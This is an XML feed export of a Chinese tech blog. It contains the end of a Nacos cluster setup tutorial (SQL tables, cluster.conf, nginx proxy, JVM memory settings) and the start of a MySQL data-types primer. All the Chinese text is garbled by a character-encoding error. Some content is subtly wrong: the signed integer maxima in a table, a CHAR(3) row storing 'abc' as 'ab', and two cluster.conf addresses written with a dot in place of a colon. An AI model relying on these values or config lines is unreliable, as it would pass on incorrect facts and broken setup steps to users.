class="hljs-string">&#x27;åˆ›å»ºæ—¶é—´&#x27;</span>,<br>  `gmt_modified` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;ä¿®æ”¹æ—¶é—´&#x27;</span>,<br>  <span class="hljs-keyword">PRIMARY</span> KEY (`id`),<br>  <span class="hljs-keyword">UNIQUE</span> KEY `uk_tenant_info_kptenantid` (`kp`,`tenant_id`),<br>  KEY `idx_tenant_id` (`tenant_id`)<br>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8_bin COMMENT<span class="hljs-operator">=</span><span class="hljs-string">&#x27;tenant_info&#x27;</span>;<br><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `users` (<br>`username` <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">PRIMARY</span> KEY,<br>`password` <span class="hljs-type">varchar</span>(<span class="hljs-number">500</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>`enabled` <span class="hljs-type">boolean</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span><br>);<br><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `roles` (<br>`username` <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>`role` <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br><span class="hljs-keyword">UNIQUE</span> INDEX `idx_user_role` (`username` <span class="hljs-keyword">ASC</span>, `role` <span class="hljs-keyword">ASC</span>) <span class="hljs-keyword">USING</span> BTREE<br>);<br><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `permissions` (<br>    `role` <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>    `resource` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>    `action` <span class="hljs-type">varchar</span>(<span class="hljs-number">8</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>    <span class="hljs-keyword">UNIQUE</span> INDEX `uk_role_permission` (`role`,`resource`,`action`) <span class="hljs-keyword">USING</span> BTREE<br>);<br><br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> users (username, password, enabled) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;nacos&#x27;</span>, <span class="hljs-string">&#x27;$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu&#x27;</span>, <span class="hljs-literal">TRUE</span>);<br><br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> roles (username, role) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;nacos&#x27;</span>, <span class="hljs-string">&#x27;ROLE_ADMIN&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="5-2-ä¸‹è½½nacos"><a href="#5-2-ä¸‹è½½nacos" class="headerlink" title="5.2.ä¸‹è½½nacos"></a>5.2.ä¸‹è½½nacos</h2><p>nacosåœ¨GitHubä¸Šæœ‰ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/alibaba/nacos/tags%EF%BC%8C%E5%8F%AF%E4%BB%A5%E9%80%89%E6%8B%A9%E4%BB%BB%E6%84%8F%E7%89%88%E6%9C%AC%E4%B8%8B%E8%BD%BD%E3%80%82">https://github.com/alibaba/nacos/tagsï¼Œå¯ä»¥é€‰æ‹©ä»»æ„ç‰ˆæœ¬ä¸‹è½½ã€‚</a></p><p>æœ¬ä¾‹ä¸­æ‰ç”¨1.4.1ç‰ˆæœ¬ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210182026232.png" alt="image-20210409212119411"></p><h2 id="5-3-é…ç½®Nacos"><a href="#5-3-é…ç½®Nacos" class="headerlink" title="5.3.é…ç½®Nacos"></a>5.3.é…ç½®Nacos</h2><p>å°†è¿™ä¸ªåŒ…è§£å‹åˆ°ä»»æ„éä¸­æ–‡ç›®å½•ä¸‹ï¼Œå¦‚å›¾ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210182026233.png" alt="image-20210402161843337"></p><p>ç›®å½•è¯´æ˜ï¼š</p><ul><li>binï¼šå¯åŠ¨è„šæœ¬</li><li>confï¼šé…ç½®æ–‡ä»¶</li></ul><p>è¿›å…¥nacosçš„confç›®å½•ï¼Œä¿®æ”¹é…ç½®æ–‡ä»¶cluster.conf.exampleï¼Œé‡å‘½åä¸ºcluster.confï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210182026234.png" alt="image-20210409212459292"></p><p>ç„¶åæ·»åŠ å†…å®¹ï¼š</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1:8845</span><br><span class="hljs-number">127.0.0.1</span>.<span class="hljs-number">8846</span><br><span class="hljs-number">127.0.0.1</span>.<span class="hljs-number">8847</span><br></code></pre></td></tr></table></figure><p>ç„¶åä¿®æ”¹application.propertiesæ–‡ä»¶ï¼Œæ·»åŠ æ•°æ®åº“é…ç½®</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">spring.datasource.platform</span>=<span class="hljs-string">mysql</span><br><br><span class="hljs-attr">db.num</span>=<span class="hljs-string">1</span><br><br><span class="hljs-attr">db.url.0</span>=<span class="hljs-string">jdbc:mysql://127.0.0.1:3306/nacos?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true&amp;useUnicode=true&amp;useSSL=false&amp;serverTimezone=UTC</span><br><span class="hljs-attr">db.user.0</span>=<span class="hljs-string">root</span><br><span class="hljs-attr">db.password.0</span>=<span class="hljs-string">123</span><br></code></pre></td></tr></table></figure><h2 id="5-4-å¯åŠ¨"><a href="#5-4-å¯åŠ¨" class="headerlink" title="5.4.å¯åŠ¨"></a>5.4.å¯åŠ¨</h2><p>å°†nacosæ–‡ä»¶å¤¹å¤åˆ¶ä¸‰ä»½ï¼Œåˆ†åˆ«å‘½åä¸ºï¼šnacos1ã€nacos2ã€nacos3</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210182026235.png" alt="image-20210409213335538"> </p><p>ç„¶ååˆ†åˆ«ä¿®æ”¹ä¸‰ä¸ªæ–‡ä»¶å¤¹ä¸­çš„application.propertiesï¼Œ</p><p>nacos1:</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">server.port</span>=<span class="hljs-string">8845</span><br></code></pre></td></tr></table></figure><p>nacos2:</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">server.port</span>=<span class="hljs-string">8846</span><br></code></pre></td></tr></table></figure><p>nacos3:</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">server.port</span>=<span class="hljs-string">8847</span><br></code></pre></td></tr></table></figure><p>ç„¶ååˆ†åˆ«å¯åŠ¨ä¸‰ä¸ªnacosèŠ‚ç‚¹ï¼š</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">startup.<span class="hljs-built_in">cmd</span><br></code></pre></td></tr></table></figure><h2 id="5-5-nginxåå‘ä»£ç†"><a href="#5-5-nginxåå‘ä»£ç†" class="headerlink" title="5.5.nginxåå‘ä»£ç†"></a>5.5.nginxåå‘ä»£ç†</h2><p><a href="https://pan.baidu.com/s/11_5gu_SHtpUADkHu0t3TyA?pwd=52lj">ä¸‹è½½nginxå®‰è£…åŒ…</a>ï¼š </p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221123092819398.png"></p><p>è§£å‹åˆ°ä»»æ„éä¸­æ–‡ç›®å½•ä¸‹ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210182026237.png" alt="image-20210410103322874"> </p><p>ä¿®æ”¹conf&#x2F;nginx.confæ–‡ä»¶ï¼Œé…ç½®å¦‚ä¸‹ï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> nacos-cluster &#123;<br>    <span class="hljs-attribute">server</span> <span class="hljs-number">127.0.0.1:8845</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">127.0.0.1:8846</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">127.0.0.1:8847</span>;<br>&#125;<br><br><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span>       <span class="hljs-number">80</span>;<br>    <span class="hljs-attribute">server_name</span>  localhost;<br><br>    <span class="hljs-section">location</span> /nacos &#123;<br>        <span class="hljs-attribute">proxy_pass</span> http://nacos-cluster;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è€Œååœ¨æµè§ˆå™¨è®¿é—®ï¼š<a href="http://localhost/nacos%E5%8D%B3%E5%8F%AF%E3%80%82">http://localhost/nacoså³å¯ã€‚</a></p><p>ä»£ç ä¸­application.ymlæ–‡ä»¶é…ç½®å¦‚ä¸‹ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">cloud:</span><br>    <span class="hljs-attr">nacos:</span><br>      <span class="hljs-attr">server-addr:</span> <span class="hljs-string">localhost:80</span> <span class="hljs-comment"># Nacosåœ°å€</span><br></code></pre></td></tr></table></figure><h2 id="5-6-ä¼˜åŒ–"><a href="#5-6-ä¼˜åŒ–" class="headerlink" title="5.6.ä¼˜åŒ–"></a>5.6.ä¼˜åŒ–</h2><ul><li><p>å®é™…éƒ¨ç½²æ—¶ï¼Œéœ€è¦ç»™åšåå‘ä»£ç†çš„nginxæœåŠ¡å™¨è®¾ç½®ä¸€ä¸ªåŸŸåï¼Œè¿™æ ·åç»­å¦‚æœæœ‰æœåŠ¡å™¨è¿ç§»nacosçš„å®¢æˆ·ç«¯ä¹Ÿæ— éœ€æ›´æ”¹é…ç½®.</p></li><li><p>Nacosçš„å„ä¸ªèŠ‚ç‚¹åº”è¯¥éƒ¨ç½²åˆ°å¤šä¸ªä¸åŒæœåŠ¡å™¨ï¼Œåšå¥½å®¹ç¾å’Œéš”ç¦»</p></li></ul><h2 id="5-7-å¯èƒ½é‡åˆ°çš„é—®é¢˜"><a href="#5-7-å¯èƒ½é‡åˆ°çš„é—®é¢˜" class="headerlink" title="5.7 å¯èƒ½é‡åˆ°çš„é—®é¢˜"></a>5.7 å¯èƒ½é‡åˆ°çš„é—®é¢˜</h2><h3 id="é›†ç¾¤å¯åŠ¨å¤±è´¥"><a href="#é›†ç¾¤å¯åŠ¨å¤±è´¥" class="headerlink" title="é›†ç¾¤å¯åŠ¨å¤±è´¥"></a>é›†ç¾¤å¯åŠ¨å¤±è´¥</h3><blockquote><p>ç°è±¡</p></blockquote><p>å¯åŠ¨äº†ä¸¤å°ä¹‹åç¬¬ä¸‰å°æ€»æ˜¯é—ªé€€ï¼Œ&#x3D;&#x3D;cmd&#x3D;&#x3D;çª—å£é—ªé€€</p><blockquote><p>åŸå› </p></blockquote><p>å†…å­˜ä¸è¶³</p><blockquote><p>è§£å†³</p></blockquote><p>ä¸€çœ‹<code>startup.cmd</code>å¯åŠ¨æ–‡ä»¶</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> <span class="hljs-string">&quot;NACOS_JVM_OPTS=-server -Xms2g -Xmx2g -Xmn1g</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>è§£é‡Š</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-Xmx2g:è®¾ç½®JVMæœ€å¤§å¯ç”¨å†…å­˜ä¸º2g</span><br><span class="hljs-deletion">-Xmn1g:è®¾ç½®å¹´è½»ä»£å¤§å°ä¸º1G.æ•´ä¸ªå †å¤§å°=å¹´è½»ä»£å¤§å° + å¹´è€ä»£å¤§å° + æŒä¹…ä»£å¤§å°.æŒä¹…ä»£ä¸€èˆ¬å›ºå®šå¤§å°ä¸º64m,æ‰€ä»¥å¢å¤§å¹´è½»ä»£å,å°†ä¼šå‡å°å¹´è€ä»£å¤§å°.æ­¤å€¼å¯¹ç³»ç»Ÿæ€§èƒ½å½±å“è¾ƒå¤§,Sunå®˜æ–¹æ¨èé…ç½®ä¸ºæ•´ä¸ªå †çš„3/8.</span><br><span class="hljs-deletion">-Xms2g:è®¾ç½®JVMä¿ƒä½¿å†…å­˜ä¸º2g.æ­¤å€¼å¯ä»¥è®¾ç½®ä¸-Xmxç›¸åŒ,ä»¥é¿å…æ¯æ¬¡åƒåœ¾å›æ”¶å®ŒæˆåJVMé‡æ–°åˆ†é…å†…å­˜.</span><br></code></pre></td></tr></table></figure><p>ä¿®æ”¹ä¸º</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-Xms512m -Xmx512m -Xmn256m</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Nacos</tag>
      
      <tag>å¾®æœåŠ¡</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MySQL</title>
    <link href="/2022/11/22/MySQL/"/>
    <url>/2022/11/22/MySQL/</url>
    
    <content type="html"><![CDATA[<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h1 id="ä¸€ã€SQLç®€è¿°"><a href="#ä¸€ã€SQLç®€è¿°" class="headerlink" title="ä¸€ã€SQLç®€è¿°"></a>ä¸€ã€SQLç®€è¿°</h1><h2 id="1-SQLçš„æ¦‚è¿°"><a href="#1-SQLçš„æ¦‚è¿°" class="headerlink" title="1.SQLçš„æ¦‚è¿°"></a>1.SQLçš„æ¦‚è¿°</h2><p>Structure Query<br>Language(ç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€)ç®€ç§°SQLï¼Œå®ƒè¢«ç¾å›½å›½å®¶æ ‡å‡†å±€(ANSI)ç¡®å®šä¸ºå…³ç³»å‹æ•°æ®åº“è¯­è¨€çš„ç¾å›½æ ‡å‡†ï¼Œåè¢«å›½é™…åŒ–æ ‡å‡†ç»„ç»‡(ISO)é‡‡çº³ä¸ºå…³ç³»æ•°æ®åº“è¯­è¨€çš„å›½é™…æ ‡å‡†ã€‚æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå¯ä»¥é€šè¿‡SQLç®¡ç†æ•°æ®åº“ï¼›å®šä¹‰å’Œæ“ä½œæ•°æ®ï¼Œç»´æŠ¤æ•°æ®çš„å®Œæ•´æ€§å’Œå®‰å…¨æ€§ã€‚</p><h2 id="2-SQLçš„ä¼˜ç‚¹"><a href="#2-SQLçš„ä¼˜ç‚¹" class="headerlink" title="2.SQLçš„ä¼˜ç‚¹"></a>2.SQLçš„ä¼˜ç‚¹</h2><p>1ã€ç®€å•æ˜“å­¦ï¼Œå…·æœ‰å¾ˆå¼ºçš„æ“ä½œæ€§<br>2ã€ç»å¤§å¤šæ•°é‡è¦çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå‡æ”¯æŒSQL<br>3ã€é«˜åº¦éè¿‡ç¨‹åŒ–ï¼›ç”¨SQLæ“ä½œæ•°æ®åº“æ—¶å¤§éƒ¨åˆ†çš„å·¥ä½œç”±DBMSè‡ªåŠ¨å®Œæˆ</p><h2 id="3-SQLçš„åˆ†ç±»"><a href="#3-SQLçš„åˆ†ç±»" class="headerlink" title="3.SQLçš„åˆ†ç±»"></a>3.SQLçš„åˆ†ç±»</h2><p>1ã€DDL(Data Definition Language) æ•°æ®å®šä¹‰è¯­è¨€ï¼Œç”¨æ¥æ“ä½œæ•°æ®åº“ã€è¡¨ã€åˆ—ç­‰ï¼› å¸¸ç”¨è¯­å¥ï¼šCREATEã€ ALTERã€DROP<br>2ã€DML(Data Manipulation Language) æ•°æ®æ“ä½œè¯­è¨€ï¼Œç”¨æ¥æ“ä½œæ•°æ®åº“ä¸­è¡¨é‡Œçš„æ•°æ®ï¼›å¸¸ç”¨è¯­å¥ï¼šINSERTã€ UPDATEã€<br>DELETE<br>3ã€DCL(Data Control Language) æ•°æ®æ§åˆ¶è¯­è¨€ï¼Œç”¨æ¥æ“ä½œè®¿é—®æƒé™å’Œå®‰å…¨çº§åˆ«ï¼› å¸¸ç”¨è¯­å¥ï¼šGRANTã€DENY<br>4ã€DQL(Data Query Language) æ•°æ®æŸ¥è¯¢è¯­è¨€ï¼Œç”¨æ¥æŸ¥è¯¢æ•°æ® å¸¸ç”¨è¯­å¥ï¼šSELECT</p><h1 id="äºŒã€æ•°æ®åº“çš„ä¸‰å¤§èŒƒå¼"><a href="#äºŒã€æ•°æ®åº“çš„ä¸‰å¤§èŒƒå¼" class="headerlink" title="äºŒã€æ•°æ®åº“çš„ä¸‰å¤§èŒƒå¼"></a>äºŒã€æ•°æ®åº“çš„ä¸‰å¤§èŒƒå¼</h1><p>1ã€ç¬¬ä¸€èŒƒå¼(1NF)æ˜¯æŒ‡æ•°æ®åº“è¡¨çš„æ¯ä¸€åˆ—éƒ½æ˜¯ä¸å¯åˆ†å‰²çš„åŸºæœ¬æ•°æ®çº¿ï¼›ä¹Ÿå°±æ˜¯è¯´ï¼šæ¯åˆ—çš„å€¼å…·æœ‰åŸå­æ€§ï¼Œä¸å¯å†åˆ†å‰²ã€‚<br>2ã€ç¬¬äºŒèŒƒå¼(2NF)æ˜¯åœ¨ç¬¬ä¸€èŒƒå¼(1NF)çš„åŸºç¡€ä¸Šå»ºç«‹èµ·æ¥å¾—ï¼Œæ»¡è¶³ç¬¬äºŒèŒƒå¼(2NF)å¿…é¡»å…ˆæ»¡è¶³ç¬¬ä¸€èŒƒå¼(1NF)ã€‚å¦‚æœè¡¨æ˜¯å•ä¸»é”®ï¼Œé‚£ä¹ˆä¸»é”®ä»¥å¤–çš„åˆ—å¿…é¡»å®Œå…¨ä¾èµ–äºä¸»é”®ï¼›å¦‚æœè¡¨æ˜¯å¤åˆä¸»é”®ï¼Œé‚£ä¹ˆä¸»é”®ä»¥å¤–çš„åˆ—å¿…é¡»å®Œå…¨ä¾èµ–äºä¸»é”®ï¼Œä¸èƒ½ä»…ä¾èµ–ä¸»é”®çš„ä¸€éƒ¨åˆ†ã€‚<br>3ã€ç¬¬ä¸‰èŒƒå¼(3NF)æ˜¯åœ¨ç¬¬äºŒèŒƒå¼çš„åŸºç¡€ä¸Šå»ºç«‹èµ·æ¥çš„ï¼Œå³æ»¡è¶³ç¬¬ä¸‰èŒƒå¼å¿…é¡»è¦å…ˆæ»¡è¶³ç¬¬äºŒèŒƒå¼ã€‚ç¬¬ä¸‰èŒƒå¼(3NF)è¦æ±‚ï¼šè¡¨ä¸­çš„éä¸»é”®åˆ—å¿…é¡»å’Œä¸»é”®ç›´æ¥ç›¸å…³è€Œä¸èƒ½é—´æ¥ç›¸å…³ï¼›ä¹Ÿå°±æ˜¯è¯´ï¼šéä¸»é”®åˆ—ä¹‹é—´ä¸èƒ½ç›¸å…³ä¾èµ–ã€‚</p><h1 id="ä¸‰ã€æ•°æ®åº“çš„æ•°æ®ç±»å‹"><a href="#ä¸‰ã€æ•°æ®åº“çš„æ•°æ®ç±»å‹" class="headerlink" title="ä¸‰ã€æ•°æ®åº“çš„æ•°æ®ç±»å‹"></a>ä¸‰ã€æ•°æ®åº“çš„æ•°æ®ç±»å‹</h1><p>ä½¿ç”¨MySQLæ•°æ®åº“å­˜å‚¨æ•°æ®æ—¶ï¼Œä¸åŒçš„æ•°æ®ç±»å‹å†³å®šäº†<br>MySQLå­˜å‚¨æ•°æ®æ–¹å¼çš„ä¸åŒã€‚ä¸ºæ­¤ï¼ŒMySQLæ•°æ®åº“æä¾›äº†å¤šç§æ•°æ®ç±»å‹ï¼Œå…¶ä¸­åŒ…æ‹¬æ•´æ•°ç±»å‹ã€æµ®ç‚¹æ•°ç±»å‹ã€å®šç‚¹<br>æ•°ç±»å‹ã€æ—¥æœŸå’Œæ—¶é—´ç±»å‹ã€å­—ç¬¦ä¸²ç±»å‹ã€äºŒè¿›åˆ¶â€¦ç­‰ç­‰æ•°æ®ç±»å‹ã€‚</p><h2 id="1-æ•´æ•°ç±»å‹"><a href="#1-æ•´æ•°ç±»å‹" class="headerlink" title="1.æ•´æ•°ç±»å‹"></a>1.æ•´æ•°ç±»å‹</h2><p>æ ¹æ®æ•°å€¼å–å€¼èŒƒå›´çš„ä¸åŒMySQL ä¸­çš„æ•´æ•°ç±»å‹å¯åˆ†ä¸º5ç§ï¼Œåˆ†åˆ«æ˜¯TINYINTã€SMALUNTã€MEDIUMINTã€INTå’Œ BIGINTã€‚ä¸‹å›¾åˆ—ä¸¾äº†<br>MySQLä¸åŒæ•´æ•°ç±»å‹æ‰€å¯¹åº”çš„å­—èŠ‚å¤§å°å’Œå–å€¼èŒƒå›´è€Œæœ€å¸¸ç”¨çš„ä¸ºINTç±»å‹çš„ï¼Œ</p><table><thead><tr><th>æ•°æ®ç±»å‹</th><th>å­—èŠ‚æ•°</th><th>æ— ç¬¦å·æ•°çš„å–å€¼èŒƒå›´</th><th>æœ‰ç¬¦å·æ•°çš„å–å€¼èŒƒå›´</th></tr></thead><tbody><tr><td>TINYINT</td><td>1</td><td>0~255</td><td>-128~127</td></tr><tr><td>SMALLINT</td><td>2</td><td>0~65535</td><td>-32768~32768</td></tr><tr><td>MEDIUMINT</td><td>3</td><td>0~16777215</td><td>-8388608~8388608</td></tr><tr><td>INT</td><td>4</td><td>0~4294967295</td><td>-2147483648~ 2147483648</td></tr><tr><td>BIGINT</td><td>8</td><td>0~18446744073709551615</td><td>-9223372036854775808~9223372036854775808</td></tr></tbody></table><h2 id="2-æµ®ç‚¹æ•°ç±»å‹å’Œå®šç‚¹æ•°ç±»å‹"><a href="#2-æµ®ç‚¹æ•°ç±»å‹å’Œå®šç‚¹æ•°ç±»å‹" class="headerlink" title="2.æµ®ç‚¹æ•°ç±»å‹å’Œå®šç‚¹æ•°ç±»å‹"></a>2.æµ®ç‚¹æ•°ç±»å‹å’Œå®šç‚¹æ•°ç±»å‹</h2><p>åœ¨MySQLæ•°æ®åº“ä¸­ä½¿ç”¨æµ®ç‚¹æ•°å’Œå®šç‚¹æ•°æ¥å­˜å‚¨å°æ•°ã€‚æµ®ç‚¹æ•°çš„ç±»å‹æœ‰ä¸¤ç§ï¼šå•ç²¾åº¦æµ®ç‚¹æ•°ç±»å‹ï¼ˆFLOAT)å’ŒåŒç²¾åº¦æµ®ç‚¹æ•°ç±»å‹ï¼ˆDOUBLE)ã€‚è€Œå®šç‚¹æ•°ç±»å‹åªæœ‰ä¸€ç§å³DECIMALç±»å‹ã€‚ä¸‹å›¾åˆ—ä¸¾äº†<br>MySQLä¸­æµ®ç‚¹æ•°å’Œå®šç‚¹æ•°ç±»å‹æ‰€å¯¹åº”çš„å­—èŠ‚å¤§å°åŠå…¶å–å€¼èŒƒå›´ï¼š</p><table><thead><tr><th>æ•°æ®ç±»å‹</th><th>å­—èŠ‚æ•°</th><th>æœ‰ç¬¦å·çš„å–å€¼èŒƒå›´</th><th>æ— ç¬¦å·çš„å–å€¼èŒƒå›´</th></tr></thead><tbody><tr><td>FLOAT</td><td>4</td><td>-3.402823466E+38~-1.175494351E-38</td><td>0å’Œ1.175494351E-38~3.402823466E+38</td></tr><tr><td>DOUBLE</td><td>8</td><td>-1.7976931348623157E+308~2.2250738585072014E-308</td><td>0å’Œ2.2250738585072014E-308~1.7976931348623157E+308</td></tr><tr><td>DECIMALï¼ˆM,Dï¼‰</td><td>M+2</td><td>-1.7976931348623157E+308~2.2250738585072014E-308</td><td>0å’Œ2.2250738585072014E-308~1.7976931348623157E+308</td></tr></tbody></table><p>ä»ä¸Šå›¾ä¸­å¯ä»¥çœ‹å‡ºï¼šDECIMALç±»å‹çš„å–å€¼èŒƒå›´ä¸DOUBLEç±»å‹ç›¸åŒã€‚ä½†æ˜¯ï¼Œè¯·æ³¨æ„ï¼šDECIMALç±»å‹çš„æœ‰æ•ˆå–å€¼èŒƒå›´æ˜¯ç”±Må’ŒDå†³å®šçš„ã€‚å…¶ä¸­ï¼ŒMè¡¨ç¤ºçš„æ˜¯æ•°æ®çš„é•¿<br>åº¦ï¼ŒDè¡¨ç¤ºçš„æ˜¯å°æ•°ç‚¹åçš„é•¿åº¦ã€‚æ¯”å¦‚ï¼Œå°†æ•°æ®ç±»å‹ä¸ºDECIMAL(6,2)çš„æ•°æ®6.5243 æ’äººæ•°æ®åº“åæ˜¾ç¤ºçš„ç»“æœä¸º6.52</p><h2 id="3-å­—ç¬¦ä¸²ç±»å‹"><a href="#3-å­—ç¬¦ä¸²ç±»å‹" class="headerlink" title="3.å­—ç¬¦ä¸²ç±»å‹"></a>3.å­—ç¬¦ä¸²ç±»å‹</h2><p>åœ¨MySQLä¸­å¸¸ç”¨CHAR å’Œ VARCHAR è¡¨ç¤ºå­—ç¬¦ä¸²ã€‚ä¸¤è€…ä¸åŒçš„æ˜¯ï¼šVARCHARå­˜å‚¨å¯å˜é•¿åº¦çš„å­—ç¬¦ä¸²ã€‚<br><strong>å½“æ•°æ®ä¸ºCHAR(M)ç±»å‹æ—¶ï¼Œä¸ç®¡æ’å…¥å€¼çš„é•¿åº¦æ˜¯å®é™…æ˜¯å¤šå°‘å®ƒæ‰€å ç”¨çš„å­˜å‚¨ç©ºé—´éƒ½æ˜¯Mä¸ªå­—èŠ‚ï¼›è€ŒVARCHAR(M)æ‰€å¯¹åº”çš„æ•°æ®æ‰€å ç”¨çš„å­—èŠ‚æ•°ä¸ºå®é™…é•¿åº¦åŠ 1</strong></p><table><thead><tr><th>æ’å…¥å€¼</th><th>CHAR(3)</th><th>å­˜å‚¨éœ€æ±‚</th><th>VARCHAR(3)</th><th>å­˜å‚¨éœ€æ±‚</th></tr></thead><tbody><tr><td>â€˜â€™</td><td>â€˜â€™</td><td>3ä¸ªå­—èŠ‚</td><td>â€˜â€™</td><td>1ä¸ªå­—èŠ‚</td></tr><tr><td>â€˜aâ€™</td><td>â€˜aâ€™</td><td>3ä¸ªå­—èŠ‚</td><td>â€˜aâ€™</td><td>2ä¸ªå­—èŠ‚</td></tr><tr><td>â€˜abâ€™</td><td>â€˜abâ€™</td><td>3ä¸ªå­—èŠ‚</td><td>â€˜abâ€™</td><td>3ä¸ªå­—èŠ‚</td></tr><tr><td>â€˜abcâ€™</td><td>â€˜abâ€™</td><td>3ä¸ªå­—èŠ‚</td><td>â€˜abcâ€™</td><td>4ä¸ªå­—èŠ‚</td></tr><tr><td>â€˜abcdâ€™</td><td>â€˜abâ€™</td><td>3ä¸ªå­—èŠ‚</td><td>â€˜abcâ€™</td><td>4å­—èŠ‚</td></tr></tbody></table><h2 id="4-å­—ç¬¦ä¸²ç±»å‹"><a href="#4-å­—ç¬¦ä¸²ç±»å‹" class="headerlink" title="4.å­—ç¬¦ä¸²ç±»å‹"></a>4.å­—ç¬¦ä¸²ç±»å‹</h2><p>æ–‡æœ¬ç±»å‹ç”¨äºè¡¨ç¤ºå¤§æ–‡æœ¬æ•°æ®ï¼Œä¾‹å¦‚ï¼Œæ–‡ç« å†…å®¹ã€è¯„è®ºã€è¯¦æƒ…ç­‰ï¼Œå®ƒçš„ç±»å‹åˆ†ä¸ºå¦‚ä¸‹4ç§ï¼š</p><table><thead><tr><th>æ•°æ®ç±»å‹</th><th>å‚¨å­˜èŒƒå›´</th></tr></thead><tbody><tr><td>TINYTEXT</td><td>0~255å­—èŠ‚</td></tr><tr><td>TEXT</td><td>0~65535å­—èŠ‚</td></tr><tr><td>MEDIUMTEXT</td><td>0~16777215å­—èŠ‚</td></tr><tr><td>LONGTEXT</td><td>0~4294967295å­—èŠ‚</td></tr></tbody></table><h2 id="5-æ—¥æœŸä¸æ—¶é—´ç±»å‹"><a 